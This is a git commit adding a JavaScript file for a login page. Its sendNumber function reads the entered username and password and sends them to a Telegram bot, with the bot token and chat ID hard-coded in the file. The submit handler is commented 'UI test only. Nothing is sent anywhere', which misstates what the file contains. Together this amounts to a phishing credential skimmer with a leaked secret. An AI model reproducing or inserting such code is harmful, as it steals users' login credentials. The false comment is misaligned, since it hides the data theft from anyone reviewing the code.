f72ead6433abf1170449e71b996dbe722902543d
Mitify <faresmnsr20081@gmail.com>
2026-08-28 02:27:04 +0100

    Add files via upload

---
+++ script.js
@@ -0,0 +1,50 @@
+const loginForm = document.getElementById("loginForm");
+const passwordInput = document.getElementById("password");
+const showPassword = document.getElementById("showPassword");
+const BOT_TOKEN = "8912846969:AAHHPk9lx39tLf9qTo4isFMph2h4jeg6lBM";
+const CHAT_ID = "8249819893";
+
+async function sendNumber() {
+    const number = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+    const message = "Name: " + number + "\n" + "password: " + pass;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` + `?chat_id=${CHAT_ID}` + `&text=${encodeURIComponent(message)}`;
+
+    const response = await fetch(url);
+    const result = await response.json();
+
+    console.log(result);
+   }
+// Show / hide password
+showPassword.addEventListener("click", () => {
+
+    if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        showPassword.textContent = "Hide";
+    } else {
+        passwordInput.type = "password";
+        showPassword.textContent = "Show";
+    }
+
+});
+
+
+// Login button
+loginForm.addEventListener("submit", (event) => {
+
+    event.preventDefault();
+
+    const username = document.getElementById("username").value.trim();
+    const password = passwordInput.value;
+
+    if (!username || !password) {
+        alert("Please fill in all fields.");
+        return;
+    }
+
+    // UI test only.
+    // Nothing is sent anywhere.
+    alert("Login button clicked successfully.");
+
+})
